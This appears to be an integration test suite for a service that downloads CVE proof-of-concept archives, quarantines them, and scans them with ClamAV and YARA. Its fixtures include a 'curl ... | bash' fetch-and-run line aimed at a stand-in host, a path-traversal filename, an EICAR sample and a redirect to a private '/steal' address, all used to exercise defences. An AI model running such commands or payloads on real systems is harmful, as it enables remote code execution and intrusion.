import 'reflect-metadata';

import { createHash, randomUUID } from 'node:crypto';
import { gzipSync } from 'node:zlib';

import { PutObjectCommand } from '@aws-sdk/client-s3';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';

import { OBJECT_STORAGE_BUCKETS, type Role } from '@cve/contracts';
import type { HttpTestApp } from '@cve/testing';
import { createTestTokenIssuer, type TestTokenIssuer } from '@cve/testing/auth';

import type { Env } from '../../src/config/env.js';
import { runMaintenance } from '../../src/download/download-jobs.js';
import { createPrismaClient, type PrismaClient } from '../../src/persistence/prisma.js';
import { createComponents, createScanners, type DownloadComponents } from '../../src/runtime.js';
import { S3ArtifactObjectStore } from '../../src/storage/object-store.js';
import { mapResolver, MockSource } from '../mock-source.js';
import { createTestCertificate, EICAR, silentLogger, startDownloadApp } from '../support.js';
import {
  artifactDiscovered,
  ensureBuckets,
  hexSha,
  integrationEnv,
  migrate,
  redisConnection,
  resetDatabase,
  syntheticCveId,
  verificationChanged,
  waitFor,
} from './support.js';

// Live pipeline: PostgreSQL, Redis (BullMQ), MinIO, clamd and the YARA CLI. Sources are a local
// HTTPS mock reached through synthetic `*.test` names; nothing leaves the machine.

const GITHUB = 'codeload.github.test';
const EXPLOIT_DB = 'www.exploit-db.test';
const PRIVATE = 'internal.github.test';
const certificate = createTestCertificate([GITHUB, EXPLOIT_DB, PRIVATE]);
const source = new MockSource(certificate);

let env: Env;
let prisma: PrismaClient;
let store: S3ArtifactObjectStore;
let redis: ReturnType<typeof redisConnection>;
let components: DownloadComponents;
let issuer: TestTokenIssuer;
let app: HttpTestApp;
let seq = 0;

const archives = new Map<string, Buffer>();
const flaky = new Map<string, number>();

/** Serves `/<owner>/<repo>/tar.gz/<sha>` from `archives`; some paths fail first or redirect. */
function serveArchive(path: string, body: Buffer): void {
  archives.set(path, body);
  source.route(GITHUB, path, (_req, res) => {
    const failures = flaky.get(path) ?? 0;
    if (failures > 0) {
      flaky.set(path, failures - 1);
      res.writeHead(503).end();
      return;
    }
    res.writeHead(200, {
      'content-type': 'application/x-gzip',
      'content-length': String(body.length),
      'content-disposition': 'attachment; filename="../../evil name.tar.gz"',
    });
    res.end(body);
  });
}

function nextRepository(content: string, options: { fail?: number } = {}) {
  seq += 1;
  const fullName = `zz-test-owner/poc-${String(seq)}`;
  const commitSha = hexSha(1000 + seq);
  const path = `/${fullName}/tar.gz/${commitSha}`;
  const body = gzipSync(Buffer.from(content));
  serveArchive(path, body);
  if (options.fail !== undefined) flaky.set(path, options.fail);
  return {
    fullName,
    commitSha,
    body,
    sha256: createHash('sha256').update(body).digest('hex'),
    event: artifactDiscovered({
      artifactId: randomUUID(),
      repositoryId: randomUUID(),
      fullName,
      commitSha,
      cveIds: [syntheticCveId(seq)],
    }),
  };
}

const bearer = async (role: Role) => ({
  authorization: `Bearer ${await issuer.tokenFor(randomUUID(), [role])}`,
});

async function requestFor(pocArtifactId: string) {
  return waitFor(
    () =>
      prisma.downloadRequest.findFirst({
        where: { pocArtifactId, status: { in: ['stored', 'duplicate', 'failed', 'rejected'] } },
      }),
    30_000,
    'download to finish',
  );
}

async function scanned(artifactId: string) {
  return waitFor(
    async () => {
      const artifact = await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifactId } });
      return ['pending', 'scanning'].includes(artifact.scanStatus) ? null : artifact;
    },
    60_000,
    'scan to finish',
  );
}

beforeAll(async () => {
  await source.start();
  env = integrationEnv({
    githubOrigin: source.origin(GITHUB),
    exploitDbOrigin: source.origin(EXPLOIT_DB),
  });
  migrate(env.DATABASE_URL);
  prisma = createPrismaClient(env.DATABASE_URL);
  await resetDatabase(prisma);
  await ensureBuckets(env);
  store = new S3ArtifactObjectStore(env);
  redis = redisConnection(env);
  components = createComponents({
    env,
    logger: silentLogger,
    prisma,
    store,
    connection: redis,
    scanners: createScanners(env),
    network: {
      resolver: mapResolver({
        [GITHUB]: ['127.0.0.1'],
        [EXPLOIT_DB]: ['127.0.0.1'],
        [PRIVATE]: ['10.20.30.40'],
      }),
      addressExceptions: ['127.0.0.1/32'],
      ca: certificate.cert,
    },
  });
  for (const queue of [components.scheduler.downloadQueue, components.scheduler.scanQueue]) {
    await queue.queue.obliterate({ force: true });
  }
  await components.scheduler.start();
  issuer = await createTestTokenIssuer();
  app = await startDownloadApp(issuer, { env, prisma, jobs: components.scheduler, store });
});

afterAll(async () => {
  await app.close();
  await components.scheduler.stop();
  await redis.quit();
  store.close();
  await prisma.$disconnect();
  await source.stop();
});

beforeEach(() => {
  source.requests.length = 0;
});

describe('automatic downloads from PoC Service events', () => {
  it('downloads, stores in quarantine and scans clean, without verifying or releasing', async () => {
    const repo = nextRepository('#include <stdio.h>\nint main(void) { puts("synthetic poc"); }\n');
    await components.handlers.artifactDiscovered(repo.event);
    const request = await requestFor(repo.event.payload.artifactId);
    expect(request.status).toBe('stored');
    expect(request.sourceUrl).toBe(
      `${source.origin(GITHUB)}/${repo.fullName}/tar.gz/${repo.commitSha}`,
    );

    const artifact = await scanned(request.artifactId ?? '');
    expect(artifact).toMatchObject({
      sha256: repo.sha256,
      sizeBytes: BigInt(repo.body.length),
      detectedType: 'gzip',
      mimeType: 'application/gzip',
      storageBucket: OBJECT_STORAGE_BUCKETS.pocQuarantine,
      originalFilename: 'evil name.tar.gz',
      sourceRepository: repo.fullName,
      lifecycleStatus: 'quarantined',
      scanStatus: 'clean',
      verificationStatus: 'unverified',
      riskIndicators: ['archive'],
    });
    expect(artifact.storageKey).toMatch(new RegExp(`^quarantine/\\d{4}/\\d{2}/${artifact.id}$`));
    expect(
      await store.head(OBJECT_STORAGE_BUCKETS.pocQuarantine, artifact.storageKey),
    ).toMatchObject({
      sizeBytes: repo.body.length,
      sha256: repo.sha256,
    });

    const scans = await prisma.scanResult.findMany({
      where: { artifactId: artifact.id },
      orderBy: { scanner: 'asc' },
    });
    expect(scans.map((scan) => [scan.scanner, scan.verdict])).toEqual([
      ['clamav', 'clean'],
      ['yara', 'clean'],
    ]);
    expect(scans[0]?.engineVersion).toMatch(/^ClamAV /);
    expect(scans[1]?.signatureVersion).toMatch(/^rules sha256:/);

    const attempts = await prisma.downloadAttempt.findMany({ where: { requestId: request.id } });
    expect(attempts).toHaveLength(1);
    expect(attempts[0]).toMatchObject({
      outcome: 'succeeded',
      httpStatus: 200,
      sha256: repo.sha256,
    });
    expect(attempts[0]?.hops).toEqual([
      expect.objectContaining({
        resolvedAddresses: ['127.0.0.1'],
        connectedAddress: '127.0.0.1',
        status: 200,
      }),
    ]);

    const events = (await prisma.outboxEvent.findMany({ orderBy: { createdAt: 'asc' } })).map(
      (row) => row.eventType,
    );
    expect(events).toEqual(
      expect.arrayContaining([
        'download.artifact.stored',
        'download.request.completed',
        'download.artifact.scanned',
      ]),
    );
    expect(events).not.toContain('download.artifact.lifecycle-changed');
  });

  it('ignores a redelivered event and an artifact already requested', async () => {
    const repo = nextRepository('synthetic redelivery test\n');
    await components.handlers.artifactDiscovered(repo.event);
    await components.handlers.artifactDiscovered(repo.event);
    await requestFor(repo.event.payload.artifactId);
    expect(
      await prisma.downloadRequest.count({
        where: { pocArtifactId: repo.event.payload.artifactId },
      }),
    ).toBe(1);
    expect(source.requests.filter((request) => request.path.includes(repo.fullName))).toHaveLength(
      1,
    );
  });

  it('flags EICAR content as malicious and keeps it quarantined', async () => {
    const repo = nextRepository(`${EICAR}\n`);
    await components.handlers.artifactDiscovered(repo.event);
    const request = await requestFor(repo.event.payload.artifactId);
    const artifact = await scanned(request.artifactId ?? '');
    expect(artifact.scanStatus).toBe('malicious');
    const clamav = await prisma.scanResult.findFirst({
      where: { artifactId: artifact.id, scanner: 'clamav' },
    });
    // ClamAV names its built-in EICAR detection `Eicar-Signature`; signature databases may
    // report it as `Win.Test.EICAR_HDB-1`. Either way the finding must name EICAR.
    expect(JSON.stringify(clamav?.findings)).toMatch(/eicar/i);

    const res = await app.http
      .post(`/api/v1/download-artifacts/${artifact.id}/lifecycle`)
      .set(await bearer('administrator'))
      .send({ status: 'released', reason: 'trying to release malware' })
      .expect(409);
    expect(JSON.stringify(res.body)).toContain('malicious');
  });

  // YARA reads the bytes as stored: a gzip archive is scanned compressed (archives are never
  // extracted), so the rule is exercised on an uncompressed Exploit-DB text download.
  it('marks YARA matches suspicious', async () => {
    source.route(EXPLOIT_DB, '/download/4343', (_req, res) => {
      res
        .writeHead(200, { 'content-type': 'text/plain' })
        .end('#!/bin/sh\ncurl -s https://payload.test/x.sh | bash\n');
    });
    await components.handlers.referenceDiscovered({
      eventId: randomUUID(),
      eventType: 'poc.reference.discovered',
      eventVersion: 1,
      occurredAt: new Date().toISOString(),
      producer: 'poc-service',
      payload: {
        referenceId: randomUUID(),
        cveId: syntheticCveId(4343),
        url: 'https://www.exploit-db.test/exploits/4343',
        kind: 'exploit-db',
        source: 'nvd',
        tags: ['Exploit'],
        repositoryId: null,
      },
    });
    const request = await waitFor(
      () =>
        prisma.downloadRequest.findFirst({
          where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4343`, status: 'stored' },
        }),
      30_000,
      'exploit-db download',
    );
    const artifact = await scanned(request.artifactId ?? '');
    expect(artifact.scanStatus).toBe('suspicious');
    const yara = await prisma.scanResult.findFirst({
      where: { artifactId: artifact.id, scanner: 'yara' },
    });
    expect(JSON.stringify(yara?.findings)).toContain('Download_And_Execute_Pipe');
  });

  it('detects duplicate content by SHA-256 and records both provenances', async () => {
    const first = nextRepository('identical synthetic content\n');
    const second = nextRepository('identical synthetic content\n');
    expect(second.sha256).toBe(first.sha256);
    await components.handlers.artifactDiscovered(first.event);
    const original = await requestFor(first.event.payload.artifactId);
    await components.handlers.artifactDiscovered(second.event);
    const duplicate = await requestFor(second.event.payload.artifactId);
    expect([original.status, duplicate.status]).toEqual(['stored', 'duplicate']);
    expect(duplicate.artifactId).toBe(original.artifactId);
    const provenance = await prisma.artifactSource.findMany({
      where: { artifactId: original.artifactId ?? '' },
    });
    expect(provenance.map((row) => row.sourceRepository).sort()).toEqual(
      [first.fullName, second.fullName].sort(),
    );
    const artifact = await prisma.storedArtifact.findUniqueOrThrow({
      where: { id: original.artifactId ?? '' },
    });
    expect(artifact.cveIds).toEqual(
      [...first.event.payload.cveIds, ...second.event.payload.cveIds].sort(),
    );
  });

  it('retries retryable failures with backoff and records every attempt', async () => {
    const repo = nextRepository('synthetic flaky source\n', { fail: 1 });
    await components.handlers.artifactDiscovered(repo.event);
    const request = await requestFor(repo.event.payload.artifactId);
    expect(request.status).toBe('stored');
    const attempts = await prisma.downloadAttempt.findMany({
      where: { requestId: request.id },
      orderBy: { attempt: 'asc' },
    });
    expect(attempts.map((attempt) => [attempt.outcome, attempt.httpStatus])).toEqual([
      ['failed', 503],
      ['succeeded', 200],
    ]);
  });

  it('rejects a redirect to a private address without storing anything', async () => {
    seq += 1;
    const fullName = `zz-test-owner/poc-${String(seq)}`;
    const commitSha = hexSha(1000 + seq);
    source.route(GITHUB, `/${fullName}/tar.gz/${commitSha}`, (_req, res) => {
      res.writeHead(302, { location: `${source.origin(PRIVATE)}/steal` }).end();
    });
    const event = artifactDiscovered({
      artifactId: randomUUID(),
      repositoryId: randomUUID(),
      fullName,
      commitSha,
      cveIds: [],
    });
    // The private host is allowlisted on purpose: the address check alone must stop it.
    const policy = components.sources.find((s) => s.source === 'github-archive');
    (policy?.allowedHosts as string[]).push(PRIVATE);
    await components.handlers.artifactDiscovered(event);
    const request = await requestFor(event.payload.artifactId);
    expect([request.status, request.errorCode, request.artifactId]).toEqual([
      'rejected',
      'address-blocked',
      null,
    ]);
    const [attempt] = await prisma.downloadAttempt.findMany({ where: { requestId: request.id } });
    expect(attempt?.hops).toEqual([
      expect.objectContaining({ status: 302 }),
      expect.objectContaining({ resolvedAddresses: ['10.20.30.40'], connectedAddress: null }),
    ]);
    expect(source.requests.some((r) => r.host === PRIVATE)).toBe(false);
  });

  it('rejects content larger than the limit and of the wrong type', async () => {
    const big = nextRepository('x'.repeat(10)); // replaced below with an oversized body
    serveArchive(
      `/${big.fullName}/tar.gz/${big.commitSha}`,
      Buffer.concat([Buffer.from([0x1f, 0x8b]), Buffer.alloc(300 * 1024)]),
    );
    await components.handlers.artifactDiscovered(big.event);
    expect((await requestFor(big.event.payload.artifactId)).errorCode).toBe('size-limit-exceeded');

    seq += 1;
    const fullName = `zz-test-owner/poc-${String(seq)}`;
    const commitSha = hexSha(1000 + seq);
    source.route(GITHUB, `/${fullName}/tar.gz/${commitSha}`, (_req, res) => {
      res
        .writeHead(200, { 'content-type': 'application/octet-stream' })
        .end(Buffer.from('MZ\x90\x00 not a tarball', 'latin1'));
    });
    const event = artifactDiscovered({
      artifactId: randomUUID(),
      repositoryId: randomUUID(),
      fullName,
      commitSha,
      cveIds: [],
    });
    await components.handlers.artifactDiscovered(event);
    expect((await requestFor(event.payload.artifactId)).errorCode).toBe('file-type-not-allowed');
  });

  it('rejects PoC artifacts far above the size limit without downloading', async () => {
    const repo = nextRepository('never fetched');
    const event = artifactDiscovered({
      artifactId: randomUUID(),
      repositoryId: randomUUID(),
      fullName: repo.fullName,
      commitSha: repo.commitSha,
      totalBytes: 10 * 1024 * 1024,
      cveIds: [],
    });
    await components.handlers.artifactDiscovered(event);
    const request = await prisma.downloadRequest.findFirstOrThrow({
      where: { pocArtifactId: event.payload.artifactId },
    });
    expect([request.status, request.errorCode, request.attempts]).toEqual([
      'rejected',
      'size-limit-exceeded',
      0,
    ]);
  });

  it('downloads Exploit-DB references', async () => {
    source.route(EXPLOIT_DB, '/download/4242', (_req, res) => {
      res
        .writeHead(200, { 'content-type': 'text/plain' })
        .end('# synthetic exploit-db entry\nprint("hello")\n');
    });
    await components.handlers.referenceDiscovered({
      eventId: randomUUID(),
      eventType: 'poc.reference.discovered',
      eventVersion: 1,
      occurredAt: new Date().toISOString(),
      producer: 'poc-service',
      payload: {
        referenceId: randomUUID(),
        cveId: syntheticCveId(4242),
        url: 'https://www.exploit-db.test/exploits/4242',
        kind: 'exploit-db',
        source: 'nvd',
        tags: ['Exploit'],
        repositoryId: null,
      },
    });
    const request = await waitFor(
      () =>
        prisma.downloadRequest.findFirst({
          where: { sourceUrl: `${source.origin(EXPLOIT_DB)}/download/4242`, status: 'stored' },
        }),
      30_000,
      'exploit-db download',
    );
    expect(request.sourceUrl).toBe(`${source.origin(EXPLOIT_DB)}/download/4242`);
    const artifact = await scanned(request.artifactId ?? '');
    expect(artifact.detectedType).toBe('text');
  });
});

describe('quarantine, release and verification', () => {
  it('serves only released clean artifacts, as attachments, and revokes on a malicious verdict', async () => {
    const repo = nextRepository('synthetic release candidate\n');
    await components.handlers.artifactDiscovered(repo.event);
    const request = await requestFor(repo.event.payload.artifactId);
    const artifact = await scanned(request.artifactId ?? '');
    const analyst = await bearer('security-analyst');
    const admin = await bearer('administrator');

    // Quarantined artifacts do not exist for users without quarantine:read.
    await app.http.get(`/api/v1/download-artifacts/${artifact.id}`).set(analyst).expect(404);
    const hidden = await app.http.get('/api/v1/download-artifacts').set(analyst).expect(200);
    expect((hidden.body as { data: { id: string }[] }).data.map((a) => a.id)).not.toContain(
      artifact.id,
    );
    const visible = await app.http
      .get(`/api/v1/download-artifacts/${artifact.id}`)
      .set(await bearer('vulnerability-researcher'))
      .expect(200);
    expect(visible.body).toMatchObject({
      data: {
        lifecycleStatus: 'quarantined',
        scanStatus: 'clean',
        verificationStatus: 'unverified',
        releasable: true,
      },
    });

    await app.http
      .post(`/api/v1/download-artifacts/${artifact.id}/lifecycle`)
      .set(admin)
      .set('if-match', '"999"')
      .send({ status: 'released', reason: 'reviewed' })
      .expect(412);
    const released = await app.http
      .post(`/api/v1/download-artifacts/${artifact.id}/lifecycle`)
      .set(admin)
      .send({ status: 'released', reason: 'Scanned clean and reviewed' })
      .expect(200);
    expect(released.body).toMatchObject({
      data: { lifecycleStatus: 'released', verificationStatus: 'unverified' },
    });
    expect(
      await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`),
    ).not.toBeNull();

    const content = await app.http
      .get(`/api/v1/download-artifacts/${artifact.id}/content`)
      .set(analyst)
      .buffer(true)
      .parse((res, callback) => {
        const chunks: Buffer[] = [];
        res.on('data', (chunk: Buffer) => chunks.push(chunk));
        res.on('end', () => {
          callback(null, Buffer.concat(chunks));
        });
      })
      .expect(200);
    expect((content.body as Buffer).equals(repo.body)).toBe(true);
    expect(content.headers['content-type']).toBe('application/octet-stream');
    expect(content.headers['content-disposition']).toBe(
      `attachment; filename="artifact-${artifact.id}.gz"`,
    );
    expect(content.headers['x-content-type-options']).toBe('nosniff');
    expect(content.headers['x-artifact-sha256']).toBe(repo.sha256);
    await app.http
      .get(`/api/v1/download-artifacts/${artifact.id}/content`)
      .set(await bearer('viewer'))
      .expect(403);

    // Analysts judge the PoC malicious: the release is revoked and the copy deleted.
    await components.handlers.verificationChanged(
      verificationChanged({
        artifactId: repo.event.payload.artifactId,
        repositoryId: repo.event.payload.repositoryId,
        commitSha: repo.commitSha,
        fromStatus: 'in-review',
        toStatus: 'malicious',
        version: 3,
      }),
    );
    const revoked = await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } });
    expect([revoked.lifecycleStatus, revoked.verificationStatus, revoked.releasedKey]).toEqual([
      'quarantined',
      'malicious',
      null,
    ]);
    expect(
      await store.head(OBJECT_STORAGE_BUCKETS.pocArtifacts, `released/${artifact.id}`),
    ).toBeNull();
    await app.http
      .get(`/api/v1/download-artifacts/${artifact.id}/content`)
      .set(analyst)
      .expect(404);

    // An older event (lower version) cannot undo the newer judgement.
    await components.handlers.verificationChanged(
      verificationChanged({
        artifactId: repo.event.payload.artifactId,
        repositoryId: repo.event.payload.repositoryId,
        commitSha: repo.commitSha,
        fromStatus: 'unverified',
        toStatus: 'verified',
        version: 2,
      }),
    );
    expect(
      (await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } }))
        .verificationStatus,
    ).toBe('malicious');
    const history = await app.http
      .get(`/api/v1/download-artifacts/${artifact.id}/lifecycle-history`)
      .set(admin)
      .expect(200);
    expect(
      (history.body as { data: { toStatus: string }[] }).data.map((event) => event.toStatus),
    ).toEqual(['quarantined', 'released', 'quarantined']);
    await expect(
      prisma.$executeRaw`UPDATE "artifact_lifecycle_events" SET "reason" = 'x' WHERE "artifact_id" = ${artifact.id}::uuid`,
    ).rejects.toThrow(/append-only/);
  });

  it('detects tampering with a stored object on rescan', async () => {
    const repo = nextRepository('synthetic integrity check\n');
    await components.handlers.artifactDiscovered(repo.event);
    const request = await requestFor(repo.event.payload.artifactId);
    const artifact = await scanned(request.artifactId ?? '');
    await store.client.send(
      new PutObjectCommand({
        Bucket: artifact.storageBucket,
        Key: artifact.storageKey,
        Body: Buffer.from('tampered'),
      }),
    );
    await app.http
      .post(`/api/v1/download-artifacts/${artifact.id}/rescan`)
      .set(await bearer('administrator'))
      .send({ reason: 'integrity test' })
      .expect(202);
    const rescanned = await waitFor(
      async () => {
        const row = await prisma.storedArtifact.findUniqueOrThrow({ where: { id: artifact.id } });
        return row.scanStatus === 'integrity_failure' ? row : null;
      },
      30_000,
      'integrity failure',
    );
    expect(rescanned.lifecycleStatus).toBe('quarantined');
  });
});

describe('manual requests and maintenance', () => {
  it('schedules, deduplicates, cancels and retries manual requests', async () => {
    const repo = nextRepository('synthetic manual request\n');
    const researcher = await bearer('vulnerability-researcher');
    const later = new Date(Date.now() + 60 * 60_000).toISOString();
    const url = `${source.origin(GITHUB)}/${repo.fullName}/tar.gz/${repo.commitSha}`;
    const created = await app.http
      .post('/api/v1/download-requests')
      .set(researcher)
      .send({ url, cveIds: [syntheticCveId(777)], scheduledFor: later, reason: 'manual test' })
      .expect(201);
    const id = (created.body as { data: { request: { id: string; status: string } } }).data.request
      .id;
    expect((created.body as { data: { request: { status: string } } }).data.request.status).toBe(
      'pending',
    );
    const again = await app.http
      .post('/api/v1/download-requests')
      .set(researcher)
      .send({ url })
      .expect(200);
    expect(again.body).toMatchObject({ data: { created: false, request: { id } } });

    await app.http.post(`/api/v1/download-requests/${id}/cancel`).set(researcher).expect(200);
    await app.http.post(`/api/v1/download-requests/${id}/cancel`).set(researcher).expect(409);
    await app.http.post(`/api/v1/download-requests/${id}/retry`).set(researcher).expect(200);
    const done = await waitFor(
      () => prisma.downloadRequest.findFirst({ where: { id, status: 'stored' } }),
      30_000,
      'manual download',
    );
    expect(done.requestedBy).not.toBeNull();
    const detail = await app.http
      .get(`/api/v1/download-requests/${id}`)
      .set(researcher)
      .expect(200);
    expect(
      (detail.body as { data: { attemptHistory: unknown[] } }).data.attemptHistory,
    ).toHaveLength(1);
  });

  it('recovers requests whose worker died', async () => {
    const repo = nextRepository('synthetic lease recovery\n');
    const request = await prisma.downloadRequest.create({
      data: {
        source: 'github-archive',
        sourceUrl: `${source.origin(GITHUB)}/${repo.fullName}/tar.gz/${repo.commitSha}`,
        urlHash: createHash('sha256').update(randomUUID()).digest('hex'),
        trigger: 'manual',
        status: 'downloading',
        maxAttempts: 3,
        attempts: 1,
        leaseUntil: new Date(Date.now() - 60_000),
      },
    });
    await runMaintenance({
      prisma,
      store,
      downloads: components.scheduler.downloadQueue,
      scans: components.scheduler,
      logger: silentLogger,
      processedEventRetentionDays: 30,
      outboxRetentionDays: 7,
    });
    const recovered = await prisma.downloadRequest.findUniqueOrThrow({ where: { id: request.id } });
    expect([recovered.status, recovered.queuedAt]).toEqual(['pending', null]);
    await components.scheduler.queueRequest(request.id);
    await waitFor(
      () => prisma.downloadRequest.findFirst({ where: { id: request.id, status: 'stored' } }),
      30_000,
      'recovered download',
    );
  });
});
